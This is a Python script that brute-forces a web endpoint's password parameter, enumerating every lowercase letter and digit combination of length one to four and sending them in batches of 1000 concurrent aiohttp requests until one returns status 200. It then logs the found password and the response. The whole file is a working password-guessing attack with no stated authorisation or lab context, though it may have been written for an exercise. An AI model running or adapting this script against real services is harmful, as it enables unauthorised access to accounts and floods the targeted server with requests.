import asyncio
import itertools
import string
import aiohttp
import time
from logger import logger
from env import get_url


CONCURRENT_ATTEMPTS = 1000

async def try_password(session, url, password):
    params = {'password': password}
    try:
        async with session.get(url, params=params) as response:
            return password, response.status, await response.text()
    except asyncio.TimeoutError:
        logger.debug(f"Timeout with password: {password}")
        return password, None, None

def password_generator(characters,min_length,max_length):
    for length in range(min_length,max_length+1):
        for password in itertools.product(characters,repeat=length):
            yield ''.join(password)
             
async def brute_force_password(session, url, passwords):
    tasks = []
    
    for password in passwords:
        tasks.append(try_password(session, url, password))
        
        if len(tasks) >= CONCURRENT_ATTEMPTS:
            results = await asyncio.gather(*tasks)
            for password, status, text in results:
                if status == 200:
                    logger.critical(f"Password found: {password}")
                    logger.critical(f"Response: {text}")
                    return password
                else:
                    logger.debug(f"Password {password} failed")
            tasks = []  # Reset tasks once done

    # Process any remaining passwords if they exist
    if tasks:
        results = await asyncio.gather(*tasks)
        for password, status, text in results:
            if status == 200:
                logger.critical(f"Password found: {password}")
                logger.critical(f"Response: {text}")
                return password
            else:
                logger.debug(f"Password {password} failed")



async def main():
    url = get_url()
    characters = string.ascii_lowercase + string.digits
    min_length = 1
    max_length = 4
    start_time = time.time()
    passwords = password_generator(characters, min_length, max_length)
    async with aiohttp.ClientSession() as session:
        password = await brute_force_password(session,url,passwords)
        if password:
            time_elapsed = time.time() - start_time
            logger.critical(f"Time taken to find the password: {time_elapsed:.2f} seconds")
        else:
            logger.critical("Password not found")
    
if __name__ == '__main__':
    asyncio.run(main())